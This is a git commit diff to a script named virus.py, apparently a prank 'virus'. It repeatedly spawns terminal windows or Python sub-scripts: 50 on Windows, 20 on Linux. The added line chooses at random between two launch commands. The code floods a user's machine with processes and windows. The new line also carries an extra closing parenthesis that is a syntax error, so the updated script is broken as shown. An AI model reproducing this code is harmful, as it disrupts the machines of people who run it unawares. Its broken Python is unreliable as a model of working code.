e109011df886bf6ff75fa86cbb9331e8020f487f
LiamCrsd <43929554+LiamCrsd@users.noreply.github.com>
2023-02-25 00:51:18 +0100

    Update virus.py

--- virus.py
+++ virus.py
@@ -1,10 +1,12 @@
 import os
 import time
+import random
+listeCommandeLinux = ["gnome-terminal -- script2/sousvirus.py", "gnome-terminal -- hollywood"]
 if os.name == "nt":
   for i in range(50):
     os.system("start python script2/sousvirus.py")
     time.sleep(1)
 else:
   for i in range(20):
-    os.system("gnome-terminal -- hollywood")
+    os.system(random.choice(listeCommandeLinux)))
     time.sleep(1)
